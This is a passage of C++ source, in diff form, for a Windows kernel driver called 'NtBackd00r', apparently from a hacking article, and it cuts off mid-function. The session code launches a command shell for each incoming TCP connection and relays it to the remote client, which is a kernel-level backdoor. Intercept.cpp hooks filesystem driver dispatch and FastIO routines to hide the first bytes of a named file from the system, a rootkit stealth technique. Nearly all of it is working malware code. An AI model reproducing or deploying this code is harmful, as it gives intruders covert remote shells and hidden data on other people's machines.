+                        if ((status!=STATUS_SUCCESS)&&(status!=STATUS_PENDING))
+                        {
+                                //Wait for free space in buffer...
+                                KeDelayExecutionThread(KernelMode, TRUE, &ResendInterval);
+                                //...and retry
+                                goto resend;
+                        }
+                        }
+                        //send_buf alocated here, deleted in OnSendComplete
+                        send_buf = new(NonPagedPool) uchar[bufsize];        
+                        //Start asynchronous read
+                        status=ZwReadFile(Pipes->hPipe, Pipes->hPipeEvents[1], NULL, NULL, &send_iosb, send_buf, bufsize, NULL, NULL);
+                        //If there was a data in pipe buffer, it read instantly.
+                        if (status==STATUS_SUCCESS)
+                                //send it immediately
+                                goto sending;
+                        else {
+                                if (status!=STATUS_PENDING)
+                                {
+                                        delete send_buf;
+                                        //STATUS_PIPE_LISTENING - it's OK, process not connected to pipe yet
+                                        if (status!=STATUS_PIPE_LISTENING)
+                                        {
+                                                //otherwise it was an error, disconnect client and terminate thread
+                                                if (!Pipes->Terminating) thiz->disconnect();
+                                                goto fin;
+                                        }
+                                }
+                        }
+                };
+                break;
+                //STATUS_WAIT_0 - write operation completed
+        case STATUS_WAIT_0:
+                if (Pipes->Terminating) goto fin;
+                if (!Pipes->hPipe) break;
+                //FIFO must be locked during all operation with it
+                //to avoid conflicts
+                thiz->pWBytePipe->Lock();
+                //At first look what crowd into FIFO,...
+                rd = thiz->pWBytePipe->NumberOfItemsAvailableForRead();
+                if (rd)
+                {
+                        //... then allocate appropriate amount of memory ...
+                        rcv_buf = new(NonPagedPool) uchar[rd];
+                        //... and read all at once
+                        rd = thiz->pWBytePipe->Read(rcv_buf, rd);
+                }
+                thiz->pWBytePipe->Unlock();
+                if (rd)
+                {
+                        status = ZwWriteFile(Pipes->hPipe, NULL, ApcCallbackWriteComplete, rcv_buf, &rcv_iosb, rcv_buf, rd, NULL, NULL);
+                        if ((status!=STATUS_SUCCESS)&&(status!=STATUS_PIPE_LISTENING)&&(status!=STATUS_PENDING))
+                        {
+                                //if there was an error, disconnect client and terminate thread
+                                if (!Pipes->Terminating) thiz->disconnect();
+                                goto fin;
+                        }
+                }
+                break;
+        case STATUS_ALERTED:
+                break;
+        default: goto fin;
+        }
+fin:
+        //If termination not initiated from outside, unlock socket
+        if (!Pipes->Terminating) thiz->Unlock();
+        //If pipe exists, then all the rest exists too -
+        //destroy it all
+        if (Pipes->hPipe)
+        {
+                ZwClose(Pipes->hPipe);
+                for (int i=0;i<=1;i++)
+                        ZwClose(Pipes->hPipeEvents[i]);
+                CLIENT_ID clid = {Pipes->ChildPID, 0};
+                HANDLE hProcess;
+                OBJECT_ATTRIBUTES attr={sizeof(OBJECT_ATTRIBUTES), 0, NULL, 0};
+#define PROCESS_TERMINATE         (0x0001)  
+                status = ZwOpenProcess(&hProcess, PROCESS_TERMINATE, &attr, &clid);
+                if (!status)
+                {
+                        ZwTerminateProcess(hProcess, 0);
+                        ZwClose(hProcess);
+                }
+        }
+        delete Pipes;
+        PsTerminateSystemThread(0);
+}
+
+
+#define DISABLE_INTS __asm pushfd; cli
+#define RESTORE_INTS __asm popfd;
+
+VOID ShellStarter(IN PDEVICE_OBJECT DeviceObject, IN PVOID desc1)
+{
+        OBJECT_ATTRIBUTES        attr;
+        HANDLE                                loc_hPipe, loc_hPipeEvents[2], loc_ChildPID;
+        
+        UNREFERENCED_PARAMETER(DeviceObject);
+        
+#define desc ((s_WorkItemDesc*)desc1)
+        //By course of business will check is there "cancel" command
+        if (desc->WorkItemCanceled) goto cancel2;
+        
+        //Start shell
+        loc_ChildPID = StartShell(&loc_hPipe);
+        if (loc_ChildPID)
+        {
+                InitializeObjectAttributes(&attr, NULL, 0, NULL, NULL);                
+                
+                //Create 2 events to notify thread about data receipt
+                //from socket or pipe
+                for (int i=0;i<=1;i++)
+                        ZwCreateEvent(&loc_hPipeEvents[i], EVENT_ALL_ACCESS, &attr, SynchronizationEvent, FALSE);
+                
+                //Disable interrupts and write all handles to structure that is class member
+                DISABLE_INTS
+                        if (!desc->WorkItemCanceled)
+                        {
+                                desc->thiz->m_Pipes->hPipe = loc_hPipe;
+                                desc->thiz->m_Pipes->hPipeEvents[0] = loc_hPipeEvents[0];
+                                desc->thiz->m_Pipes->hPipeEvents[1] = loc_hPipeEvents[1];
+                                desc->thiz->m_Pipes->ChildPID = loc_ChildPID;
+                        }
+                RESTORE_INTS
+
+                if (desc->WorkItemCanceled) goto cancel;
+
+                //Create thread, that transfers data between named pipe and socket
+                PsCreateSystemThread(&desc->thiz->hDataPumpThread, THREAD_ALL_ACCESS, NULL, 0, NULL, DataPumpThread, desc->thiz);
+        } else {
+cancel:
+        //In case of error or cancel close pipe, send error message to client,
+        //and disconnect it
+        ZwClose(loc_hPipe);
+        char* errmess = new(NonPagedPool) char[sizeof(errtxt_shell)-1];
+        RtlCopyMemory(errmess, errtxt_shell, sizeof(errtxt_shell)-1);
+        desc->thiz->send(errmess, sizeof(errtxt_shell)-1);
+        desc->thiz->disconnect();
+        }
+cancel2:
+        //Cleanup
+        IoFreeWorkItem(desc->WorkItem);        
+        DISABLE_INTS
+        desc->WorkItem = NULL;
+        if (!desc->WorkItemCanceled) desc->thiz->m_WorkItemDesc = NULL;
+        RESTORE_INTS
+        ExFreePool(desc1);
+#undef desc
+}
+
+/////////////////////////////////////////////////////////////////////////
+// Session   -- Event handlers.
+BOOLEAN  Session::OnConnect(uint AddressLength, PTRANSPORT_ADDRESS pTA,
+                                                        uint OptionsLength, PVOID Options)
+{
+        // Connecting: print the IP address of the requestor and grant the connection
+#if(DBG)
+        char szIPaddr[20];        
+        inet_ntoa(PTDI_ADDRESS_IP(pTA->Address[0].Address)->in_addr, szIPaddr, sizeof(szIPaddr));
+        
+    dprintf("NtBackd00rDevice: Connecting client, IP addr = %s, session %8X\n", szIPaddr, this);
+#endif
+        // obtain a pointer to the KDriver derived class
+        NtBackd00r* p = reinterpret_cast<NtBackd00r*>(KDriver::DriverInstance());
+        ASSERT(p);
+        
+        //Initialization of miscellaneous stuff
+        pWBytePipe = NULL;
+        hDataPumpThread = NULL;        
+        m_Pipes = new(NonPagedPool) s_Pipes;
+        RtlZeroMemory(m_Pipes, sizeof s_Pipes);
+
+        //Initialize and start WorkItem
+        m_WorkItemDesc = ExAllocatePool(NonPagedPool, sizeof s_WorkItemDesc);
+#define pWorkItemDesc ((s_WorkItemDesc*)m_WorkItemDesc)
+        pWorkItemDesc->WorkItemCanceled=false;
+        pWorkItemDesc->thiz=this;
+        pWorkItemDesc->WorkItem=IoAllocateWorkItem(*p->m_pDummyDevice);
+        if (!pWorkItemDesc->WorkItem) return FALSE;
+        //To make this work on NT4 replace IoQueueWorkItem with ExQueueWorkItem
+        IoQueueWorkItem(pWorkItemDesc->WorkItem, &ShellStarter, CriticalWorkQueue, pWorkItemDesc);
+#undef pWorkItemDesc        
+
+        // Add this object to the session list maintained by the driver
+        p->m_ActiveSessionList.InsertTail(this);
+        
+        UNREFERENCED_PARAMETERS4(AddressLength, pTA, OptionsLength, Options);
+    return TRUE;
+}
+
+void Session::OnDisconnect(uint OptionsLength, PVOID Options, BOOLEAN bAbort)
+{
+        
+    dprintf("NtBackd00rDevice: Disconnecting client, session %8X\n", this);
+        
+        UNREFERENCED_PARAMETERS3(OptionsLength, Options,bAbort);
+}
+
+Session::~Session()
+{
+        // obtain a pointer to the KDriver derived class
+        NtBackd00r* p = reinterpret_cast<NtBackd00r*>(KDriver::DriverInstance());
+        ASSERT(p);
+        // Remove this object from the session list maintained by the driver
+        p->m_ActiveSessionList.Remove(this);
+        
+        //Set flas, that make thread to terminate
+        m_Pipes->Terminating = true;
+        //To not wait for yesterday in OnUnload
+        hDataPumpThread = NULL;
+        //Set event "let's finish"
+        if ( m_Pipes && (m_Pipes->hPipeEvents[0])) ZwSetEvent(m_Pipes->hPipeEvents[0], NULL);
+        
+        //If WorkItem works, notify it about termination
+        if (m_WorkItemDesc) ((s_WorkItemDesc*)m_WorkItemDesc)->WorkItemCanceled=true;
+        
+        delete pWBytePipe;
+}
+
+uint Session::OnReceive(uint Indicated, uchar *Data, uint Available,
+                                                uchar **RcvBuffer, uint* RcvBufferLen)
+{
+        // Received some data from the client peer.
+        
+        //If all required pointers and handles are valid
+        if (m_Pipes && pWBytePipe && m_Pipes->hPipe)
+        {
+                //Write that data to FIFO
+                pWBytePipe->LockedWrite(Data, Indicated);
+                //And notify DataPumpThread
+                ZwSetEvent(m_Pipes->hPipeEvents[0], NULL);
+        }
+        
+
+        // Now, if the transport has more data available than indicated,
+        // allocate another buffer to read the rest. When the transport
+        // done with it - asynchronously - our OnReceiveComplete() handler
+        // is called. Note that failure to submit a buffer supressed further
+        // recieve indications - until and if a recv() is issued.
+        
+        if (Indicated < Available) {
+                *RcvBuffer = new(NonPagedPool) uchar [*RcvBufferLen = Available-Indicated];
+        }
+        
+    return Indicated;
+}
+
+void Session::OnSendComplete(PVOID buf, TDI_STATUS status, uint bytecnt)
+{
+    // Our send request has completed. Free the buffer
+        
+        if (status != TDI_SUCCESS)
+        dprintf("NtBackd00rDevice: Failed sending data, err %X\n", status);
+        //free the buffer
+        delete ((uchar*)buf);
+        
+        UNREFERENCED_PARAMETER(bytecnt);
+}
+
+void Session::OnReceiveComplete(TDI_STATUS status, uint Indicated, uchar *Data)
+{
+        // Buffer for the partially indicated data allocated and submitted during
+        // OnReceive() processing is filled in by the transport.
+        
+    if (status == TDI_SUCCESS) {
+                if (m_Pipes && pWBytePipe && m_Pipes->hPipe)
+                {
+                        //Write that data to FIFO
+                        pWBytePipe->LockedWrite(Data, Indicated);
+                        //And notify DataPumpThread
+                        ZwSetEvent(m_Pipes->hPipeEvents[0], NULL);
+                }
+        } else
+        dprintf("NtBackd00rDevice: Failed completing receive, err %X\n", status);
+        
+        if (status != TDI_PENDING)
+                delete Data;
+}
+
+// end of file
+
+
+---[ 8.10 - Intercept.cpp
+
+//This module hooks:
+// IRP_MJ_READ, IRP_MJ_WRITE, IRP_MJ_QUERY_INFORMATION,
+// IRP_MJ_SET_INFORMATION, IRP_MJ_DIRECTORY_CONTROL,
+// FASTIO_QUERY_STANDARD_INFO FASTIO_QUERY_BASIC_INFO FASTIO_READ(WRITE)
+//to hide first N bytes of given file
+
+extern "C" {
+#include <ntddk.h>
+}
+#pragma hdrstop("InterceptIO.pch")
+
+/////////////////////////////////////////////////////////////////////
+// Undocumented structures missing in ntddk.h
+
+typedef struct _FILE_INTERNAL_INFORMATION { // Information Class 6
+    LARGE_INTEGER FileId;
+} FILE_INTERNAL_INFORMATION, *PFILE_INTERNAL_INFORMATION;
+
+typedef struct _FILE_EA_INFORMATION { // Information Class 7
+    ULONG EaInformationLength;
+} FILE_EA_INFORMATION, *PFILE_EA_INFORMATION;
+
+typedef struct _FILE_ACCESS_INFORMATION { // Information Class 8
+    ACCESS_MASK GrantedAccess;
+} FILE_ACCESS_INFORMATION, *PFILE_ACCESS_INFORMATION;
+
+typedef struct _FILE_MODE_INFORMATION { // Information Class 16
+    ULONG Mode;
+} FILE_MODE_INFORMATION, *PFILE_MODE_INFORMATION;
+
+typedef struct _FILE_ALLOCATION_INFORMATION { // Information Class 19
+    LARGE_INTEGER AllocationSize;
+} FILE_ALLOCATION_INFORMATION, *PFILE_ALLOCATION_INFORMATION;
+
+typedef struct _FILE_DIRECTORY_INFORMATION {
+        ULONG NextEntryOffset;
+        ULONG FileIndex;
+        LARGE_INTEGER CreationTime;
+        LARGE_INTEGER LastAccessTime;
+        LARGE_INTEGER LastWriteTime;
+        LARGE_INTEGER ChangeTime;
+        LARGE_INTEGER EndOfFile;
+        LARGE_INTEGER AllocationSize;
+        ULONG FileAttributes;
+        ULONG FileNameLength;
+        WCHAR FileName[1];
+} FILE_DIRECTORY_INFORMATION, *PFILE_DIRECTORY_INFORMATION;
+
+typedef struct _FILE_ALL_INFORMATION { // Information Class 18
+    FILE_BASIC_INFORMATION BasicInformation;
+    FILE_STANDARD_INFORMATION StandardInformation;
+    FILE_INTERNAL_INFORMATION InternalInformation;
+    FILE_EA_INFORMATION EaInformation;
+    FILE_ACCESS_INFORMATION AccessInformation;
+    FILE_POSITION_INFORMATION PositionInformation;
+    FILE_MODE_INFORMATION ModeInformation;
+    FILE_ALIGNMENT_INFORMATION AlignmentInformation;
+    FILE_NAME_INFORMATION NameInformation;
+} FILE_ALL_INFORMATION, *PFILE_ALL_INFORMATION;
+
+typedef struct tag_QUERY_DIRECTORY
+{
+  ULONG Length;
+  PUNICODE_STRING FileName;
+  FILE_INFORMATION_CLASS FileInformationClass;
+  ULONG FileIndex;
+} QUERY_DIRECTORY, *PQUERY_DIRECTORY;
+
+#pragma pack(push, 4)
+
+typedef struct tag_FQD_SmallCommonBlock
+{
+  ULONG   NextEntryOffset;
+  ULONG   FileIndex;
+} FQD_SmallCommonBlock, *PFQD_SmallCommonBlock;
+
+typedef struct tag_FQD_FILE_ATTR
+{
+  TIME    CreationTime;
+  TIME    LastAccessTime;
+  TIME    LastWriteTime;
+  TIME    ChangeTime;
+  LARGE_INTEGER EndOfFile;
+  LARGE_INTEGER AllocationSize;
+  ULONG   FileAttributes;
+} FQD_FILE_ATTR, *PFQD_FILE_ATTR;
+
+typedef struct tag_FQD_CommonBlock
+{
+  FQD_SmallCommonBlock SmallCommonBlock;
+  FQD_FILE_ATTR        FileAttr;
+  ULONG                FileNameLength;
+} FQD_CommonBlock, *PFQD_CommonBlock;
+
+typedef struct _KFILE_DIRECTORY_INFORMATION
+{
+  FQD_CommonBlock CommonBlock;
+
+  WCHAR  FileName[ANYSIZE_ARRAY];
+} KFILE_DIRECTORY_INFORMATION, *PKFILE_DIRECTORY_INFORMATION;
+
+typedef struct _KFILE_FULL_DIR_INFORMATION
+{
+  FQD_CommonBlock CommonBlock;
+
+  ULONG  EaSize;
+  WCHAR  FileName[ANYSIZE_ARRAY];
+} KFILE_FULL_DIR_INFORMATION, *PKFILE_FULL_DIR_INFORMATION;
+
+typedef struct _KFILE_BOTH_DIR_INFORMATION
+{
+  FQD_CommonBlock CommonBlock;
+
+  ULONG  EaSize;
+  USHORT ShortFileNameLength;
+  WCHAR  ShortFileName[12];
+  WCHAR  FileName[ANYSIZE_ARRAY];
+} KFILE_BOTH_DIR_INFORMATION, *PKFILE_BOTH_DIR_INFORMATION;
+
+#pragma pack(pop)
+
+/////////////////////////////////////////////////////////////////////
+// Global variables
+PDRIVER_OBJECT      pDriverObject;
+PDRIVER_DISPATCH        OldReadDisp, OldWriteDisp, OldQueryDisp, OldSetInfoDisp, OldDirCtlDisp;
+PFAST_IO_READ                OldFastIoReadDisp;
+PFAST_IO_WRITE                OldFastIoWriteDisp;
+PFAST_IO_QUERY_STANDARD_INFO        OldFastIoQueryStandartInfoDisp;
+
+//Size of our file's Invisible Part (in bytes)
+ULONG InvisiblePartSize = 10;
+//File, part of which we want to hide
+wchar_t OurFileName[] = L"testing.fil";
+
+//Size of OurFileName in bytes, excluding null terminator
+ULONG OurFileNameLen = sizeof(OurFileName) - sizeof(wchar_t);
+
+
+/////////////////////////////////////////////////////////////////////
+// Functions
+
+//Function returns true if FN matches OurFileName
+bool ThisIsOurFile(PUNICODE_STRING FN)
+{
+        return ((FN->Buffer) &&
+                (FN->Length >= OurFileNameLen) &&
+                _wcsnicmp((wchar_t*)((char*)FN->Buffer + FN->Length - OurFileNameLen),
+                OurFileName, OurFileNameLen/2)==0);
+}
+
+//Structure used to track IRPs which completion must be handled
+struct s_ComplRtnTrack
+{
+        PIO_COMPLETION_ROUTINE CompletionRoutine;
+        PVOID Context;
+        //When CompletionRoutine is called, flags corresponds to InvokeOn*
+        UCHAR Control;
+        PIO_STACK_LOCATION CISL;
+        FILE_INFORMATION_CLASS FileInformationClass;
+        PVOID Buffer;
+};
+
+//Function set new CompletionRoutine, InvokeOnSuccess flag,
+//and copies original fields to Context
+void HookIrpCompletion(PIO_STACK_LOCATION CISL,
+                                           PIO_COMPLETION_ROUTINE CompletionRoutine,
+                                           PVOID Buffer,
+                                           FILE_INFORMATION_CLASS FileInformationClass)
+{
+        s_ComplRtnTrack* NewContext =
+                (s_ComplRtnTrack*)ExAllocatePool(NonPagedPool, sizeof(s_ComplRtnTrack));
+        NewContext->CompletionRoutine = CISL->CompletionRoutine;
+        NewContext->Context = CISL->Context;
+        NewContext->Control = CISL->Control;
+        NewContext->CISL = CISL;
+        //Since CISL.Parameters unavailabile in IrpCompletion handler,
+        //let's save all necessary data in Context structure
+        NewContext->FileInformationClass = FileInformationClass;
+        NewContext->Buffer = Buffer;
+        CISL->CompletionRoutine = CompletionRoutine;
+        CISL->Context = NewContext;
+        CISL->Control |= SL_INVOKE_ON_SUCCESS;
+}
+
+//Function handles IRP completion
+NTSTATUS NewComplRtn (
+                                          IN PDEVICE_OBJECT DeviceObject,
+                                          IN PIRP Irp,
+                                          s_ComplRtnTrack* CXT)
+{
+        //Handle different types of IRP
+        switch (CXT->CISL->MajorFunction)
+        {
+        case IRP_MJ_QUERY_INFORMATION:
+                _asm int 3;
+                //ThisIsOurFile is already tested
+                switch (CXT->FileInformationClass)
+                {
+                        //In all cases modify CurrentByteOffset and/or size (EndOfFile)
+                        //to hide first InvisiblePartSize bytes
+                case FilePositionInformation:
+                        ((PFILE_POSITION_INFORMATION)CXT->Buffer)->CurrentByteOffset.QuadPart -= InvisiblePartSize;
+                        break;
+                case FileEndOfFileInformation:
+                        ((PFILE_END_OF_FILE_INFORMATION)CXT->Buffer)->EndOfFile.QuadPart -= InvisiblePartSize;
+                        break;
+                case FileStandardInformation:
+                        ((PFILE_STANDARD_INFORMATION)CXT->Buffer)->EndOfFile.QuadPart -= InvisiblePartSize;
+                        break;
+                case FileAllocationInformation:
+                        ((PFILE_ALLOCATION_INFORMATION)CXT->Buffer)->AllocationSize.QuadPart -= InvisiblePartSize;
+                        break;
+                case FileAllInformation:
+                        ((PFILE_ALL_INFORMATION)CXT->Buffer)->PositionInformation.CurrentByteOffset.QuadPart -= InvisiblePartSize;
+                        ((PFILE_ALL_INFORMATION)CXT->Buffer)->StandardInformation.EndOfFile.QuadPart -= InvisiblePartSize;
+                        break;
+                }
+        case IRP_MJ_DIRECTORY_CONTROL:
+                //Get a pointer to first directory entries
+                PFQD_SmallCommonBlock pQueryDirWin32 = (PFQD_SmallCommonBlock)CXT->Buffer;
+                //Cycle through directory entries
+                while (1)
+                {
+                        PWCHAR pFileName = 0;
+                        ULONG dwFileNameLength = 0;
+                        switch (CXT->FileInformationClass)
+                        {
+                                //In all cases get pointer to FileName and FileNameLength
+                        case FileDirectoryInformation:
+                                dwFileNameLength = ((PKFILE_DIRECTORY_INFORMATION)pQueryDirWin32)->CommonBlock.FileNameLength;
+                                pFileName = ((PKFILE_DIRECTORY_INFORMATION)pQueryDirWin32)->FileName;
+                                break;
+                        case FileFullDirectoryInformation:
+                                dwFileNameLength = ((PKFILE_FULL_DIR_INFORMATION)pQueryDirWin32)->CommonBlock.FileNameLength;
+                                pFileName = ((PKFILE_FULL_DIR_INFORMATION)pQueryDirWin32)->FileName;
+                                break;
+                        case FileBothDirectoryInformation:
+                                dwFileNameLength = ((PKFILE_BOTH_DIR_INFORMATION)pQueryDirWin32)->CommonBlock.FileNameLength;
+                                pFileName = ((PKFILE_BOTH_DIR_INFORMATION)pQueryDirWin32)->FileName;
+                                break;
+                        }
+                        //_asm int 3;
+                        //Is this file that we want?
+                        if ((dwFileNameLength == OurFileNameLen) &&
+                                _wcsnicmp(pFileName, OurFileName, OurFileNameLen/2)==0)
+                        {
+                                //_asm int 3;
+                                //Hide first InvisiblePartSize bytes
+                                ((PFQD_CommonBlock)pQueryDirWin32)->FileAttr.EndOfFile.QuadPart -= InvisiblePartSize;
+                                break;
+                        }
+                        //Quit if no more directory entries
+                        if (!pQueryDirWin32->NextEntryOffset) break;
+                        //Continue with next directory entry
+                        pQueryDirWin32 = (PFQD_SmallCommonBlock)((CHAR*)pQueryDirWin32 + pQueryDirWin32->NextEntryOffset);
+                }
+                
+        }
+        //If appropriate Control flag was set,...
+        if (
+                ((CXT->Control == SL_INVOKE_ON_SUCCESS)&&(NT_SUCCESS(Irp->IoStatus.Status)))
+                || ((CXT->Control == SL_INVOKE_ON_ERROR)&&(NT_ERROR(Irp->IoStatus.Status)))
+                || ((CXT->Control == SL_INVOKE_ON_CANCEL)&&(Irp->IoStatus.Status == STATUS_CANCELLED)) )
+                //...call original CompletionRoutine
+                return CXT->CompletionRoutine(
+                DeviceObject,
+                Irp,
+                CXT->Context);
+        else return STATUS_SUCCESS;
+}
+
+//Filename IRP handler deal with
+#define FName &(CISL->FileObject->FileName)
+
+//Function handles IRP_MJ_READ and IRP_MJ_WRITE
+NTSTATUS NewReadWriteDisp (
+                                                   IN PDEVICE_OBJECT DeviceObject,
+                                                   IN PIRP Irp)
+{
+        //_asm int 3;
+        PIO_STACK_LOCATION CISL = IoGetCurrentIrpStackLocation(Irp);
+        if (CISL->FileObject &&
+                //Don't mess with swaping
+                !(Irp->Flags & IRP_PAGING_IO)  && !(Irp->Flags & IRP_SYNCHRONOUS_PAGING_IO))
+        {
+                if (ThisIsOurFile(FName))
+                {
+                        //_asm int 3;
+                        CISL->Parameters.Write.ByteOffset.QuadPart += InvisiblePartSize;
+                        //Write and Read has the same structure, thus handled together
+                }
+        }
+        //Call corresponding original handler
+        switch (CISL->MajorFunction)
+        {
+        case IRP_MJ_READ:
+                return OldReadDisp(DeviceObject, Irp);
+        case IRP_MJ_WRITE:
+                return OldWriteDisp(DeviceObject, Irp);
+        }
+}
+
+//Function handles IRP_MJ_QUERY_INFORMATION
+NTSTATUS NewQueryDisp (
+                                           IN PDEVICE_OBJECT DeviceObject,
+                                           IN PIRP Irp)
+{
+        //_asm int 3;
+        PIO_STACK_LOCATION CISL = IoGetCurrentIrpStackLocation(Irp);        
+        if ((CISL->MajorFunction == IRP_MJ_QUERY_INFORMATION) &&
+                ThisIsOurFile(FName))
+        {
+                //_asm int 3;
+                switch (CISL->Parameters.QueryFile.FileInformationClass)
+                {
+                        //Information types that contains file size or current offset
+                case FilePositionInformation:
+                case FileEndOfFileInformation:
+                case FileStandardInformation:
+                case FileAllocationInformation:
+                case FileAllInformation:
+                        //_asm int 3;
+                        HookIrpCompletion(CISL, (PIO_COMPLETION_ROUTINE)NewComplRtn, Irp->AssociatedIrp.SystemBuffer, CISL->Parameters.QueryFile.FileInformationClass);
+                }
+        }
+        //Call original handler
+        return OldQueryDisp(DeviceObject, Irp);
+}
+
+//Function handles IRP_MJ_SET_INFORMATION
+NTSTATUS NewSetInfoDisp (
+                                                 IN PDEVICE_OBJECT DeviceObject,
+                                                 IN PIRP Irp)
+{
+        //_asm int 3;
+        PIO_STACK_LOCATION CISL = IoGetCurrentIrpStackLocation(Irp);        
+        if (CISL->FileObject && ThisIsOurFile(FName))
+        {
+                //_asm int 3;
+                switch (CISL->Parameters.QueryFile.FileInformationClass)
+                {
+                        //Information types that contains file size or current offset.
+                        //In all cases modify CurrentByteOffset and/or size (EndOfFile)
+                        //to hide first InvisiblePartSize bytes
+                case FilePositionInformation:
+                        ((PFILE_POSITION_INFORMATION)Irp->AssociatedIrp.SystemBuffer)->CurrentByteOffset.QuadPart += InvisiblePartSize;
+                        break;
+                case FileEndOfFileInformation:
+                        ((PFILE_END_OF_FILE_INFORMATION)Irp->AssociatedIrp.SystemBuffer)->EndOfFile.QuadPart += InvisiblePartSize;
+                        break;
+                case FileStandardInformation:
+                        ((PFILE_STANDARD_INFORMATION)Irp->AssociatedIrp.SystemBuffer)->EndOfFile.QuadPart += InvisiblePartSize;
+                        break;
+                case FileAllocationInformation:
+                        //_asm int 3;
+                        ((PFILE_ALLOCATION_INFORMATION)Irp->AssociatedIrp.SystemBuffer)->AllocationSize.QuadPart += InvisiblePartSize;
+                        break;
+                case FileAllInformation:
+                        ((PFILE_ALL_INFORMATION)Irp->AssociatedIrp.SystemBuffer)->PositionInformation.CurrentByteOffset.QuadPart += InvisiblePartSize;
+                        ((PFILE_ALL_INFORMATION)Irp->AssociatedIrp.SystemBuffer)->StandardInformation.EndOfFile.QuadPart += InvisiblePartSize;
+                        break;
+                }
+        }
+        //Call original handler
+        return OldSetInfoDisp(DeviceObject, Irp);
+}
+
+//Function handles IRP_MJ_DIRECTORY_CONTROL
+NTSTATUS NewDirCtlDisp (
+                                                 IN PDEVICE_OBJECT DeviceObject,
+                                                 IN PIRP Irp)
+{
+        void *pBuffer;
+        PIO_STACK_LOCATION CISL = IoGetCurrentIrpStackLocation(Irp);        
+//_asm int 3;
+        if ((CISL->MajorFunction == IRP_MJ_DIRECTORY_CONTROL) &&
+                (CISL->MinorFunction == IRP_MN_QUERY_DIRECTORY))
+        {
+                //Handle both ways of passing user supplied buffer
+                if (Irp->MdlAddress)
+                        pBuffer = MmGetSystemAddressForMdl(Irp->MdlAddress);
+                else
+                        pBuffer = Irp->UserBuffer;
+                HookIrpCompletion(CISL, (PIO_COMPLETION_ROUTINE)NewComplRtn, pBuffer, ((PQUERY_DIRECTORY)(&CISL->Parameters))->FileInformationClass);
+        }
+        //Call original handler
+        return OldDirCtlDisp(DeviceObject, Irp);
+}
+
+#undef FName
+
+//Function handles FastIoRead
+BOOLEAN NewFastIoRead(
+    IN PFILE_OBJECT FileObject,
+    IN PLARGE_INTEGER FileOffset,
+    IN ULONG Length,
+    IN BOOLEAN Wait,
+    IN ULONG LockKey,
+    OUT PVOID Buffer,
+    OUT PIO_STATUS_BLOCK IoStatus,
+    IN PDEVICE_OBJECT DeviceObject
+    )
+{
+        LARGE_INTEGER NewFileOffset;
+        //_asm int 3;
+        if ((FileObject) && (ThisIsOurFile(&FileObject->FileName)))
+        {
+                //_asm int 3;
+                //Modify FileOffset to hide first InvisiblePartSize bytes
+                NewFileOffset.QuadPart = FileOffset->QuadPart + InvisiblePartSize;
+                return OldFastIoReadDisp(FileObject, &NewFileOffset, Length, Wait, LockKey, Buffer,
+                        IoStatus, DeviceObject);
+        }
+        //Call original handler
+        return OldFastIoReadDisp(FileObject, FileOffset, Length, Wait, LockKey, Buffer,
+                IoStatus, DeviceObject);
+}
+
+//Function handles FastIoWrite
+BOOLEAN NewFastIoWrite(
+                                           IN PFILE_OBJECT FileObject,
+                                           IN PLARGE_INTEGER FileOffset,
+                                           IN ULONG Length,
+                                           IN BOOLEAN Wait,
+                                           IN ULONG LockKey,
+                                           OUT PVOID Buffer,
+                                           OUT PIO_STATUS_BLOCK IoStatus,
+                                           IN PDEVICE_OBJECT DeviceObject
+                                           )
+{
+        LARGE_INTEGER NewFileOffset;
+        //_asm int 3;
+        if ((FileObject) && (ThisIsOurFile(&FileObject->FileName)))
+        {
+                //_asm int 3;
+                //Modify FileOffset to hide first InvisiblePartSize bytes
+                NewFileOffset.QuadPart = FileOffset->QuadPart + InvisiblePartSize;
+                return OldFastIoWriteDisp(FileObject, &NewFileOffset, Length, Wait, LockKey, Buffer,
+                        IoStatus, DeviceObject);
+        }
+        return OldFastIoWriteDisp(FileObject, FileOffset, Length, Wait, LockKey, Buffer,
+                IoStatus, DeviceObject);
+}
+
+//Function handles FastIoQueryStandartInfo
+BOOLEAN NewFastIoQueryStandartInfo(
+                                                                IN struct _FILE_OBJECT *FileObject,
+                                                                IN BOOLEAN Wait,
+                                                                OUT PFILE_STANDARD_INFORMATION Buffer,
+                                                                OUT PIO_STATUS_BLOCK IoStatus,
+                                                                IN struct _DEVICE_OBJECT *DeviceObject
+                                                                )
+{
+        //Call original handler
+        BOOLEAN status = OldFastIoQueryStandartInfoDisp(FileObject, Wait, Buffer, IoStatus, DeviceObject);
+        if ((FileObject) && (ThisIsOurFile(&FileObject->FileName)))
+        {
+                //_asm int 3;
+                //Modify EndOfFile to hide first InvisiblePartSize bytes
+                Buffer->EndOfFile.QuadPart -= InvisiblePartSize;
+        }
+        return status;
+}
+
+extern "C"
+NTSYSAPI
+NTSTATUS
+NTAPI
+ObReferenceObjectByName(
+                                                IN PUNICODE_STRING ObjectPath,
+                                                IN ULONG Attributes,
+                                                IN PACCESS_STATE PassedAccessState OPTIONAL,
+                                                IN ACCESS_MASK DesiredAccess OPTIONAL,
+                                                IN POBJECT_TYPE ObjectType,
+                                                IN KPROCESSOR_MODE AccessMode,
+                                                IN OUT PVOID ParseContext OPTIONAL,
+                                                OUT PVOID *ObjectPtr
+                                                );  
+
+extern "C" PVOID IoDriverObjectType;
+
+//Function hooks given dispatch function (MajorFunction)
+VOID InterceptFunction(UCHAR MajorFunction,
+                                           PDRIVER_OBJECT  pDriverObject,
+                                           OPTIONAL PDRIVER_DISPATCH *OldFunctionPtr,
+                                           OPTIONAL PDRIVER_DISPATCH NewFunctionPtr)
+{
+        PDRIVER_DISPATCH                                *TargetFn;
+        
+        TargetFn = &(pDriverObject->MajorFunction[MajorFunction]);
+        //hook only if handler exists
+        if (*TargetFn)
+        {
+                if (OldFunctionPtr) *OldFunctionPtr = *TargetFn;
+                if (NewFunctionPtr) *TargetFn = NewFunctionPtr;
+        }
+}
+
+//Function hooks given driver's dispatch functions
+NTSTATUS Intercept(PWSTR pwszDeviceName)
+{
+        UNICODE_STRING                DeviceName;
+        NTSTATUS status;
+        KIRQL OldIrql;
+        
+        _asm int 3;
+        
+        pDriverObject = NULL;
+        RtlInitUnicodeString(&DeviceName, pwszDeviceName);
+        status = ObReferenceObjectByName(&DeviceName, OBJ_CASE_INSENSITIVE, NULL, 0, (POBJECT_TYPE)IoDriverObjectType, KernelMode, NULL, (PVOID*)&pDriverObject);
+        if (pDriverObject)
+        {
+                //Raise IRQL to avoid context switch
+                //when some pointer is semi-modified
+                KeRaiseIrql(HIGH_LEVEL, &OldIrql);
+                //hook dispatch functions
+                InterceptFunction(IRP_MJ_READ, pDriverObject, &OldReadDisp, NewReadWriteDisp);
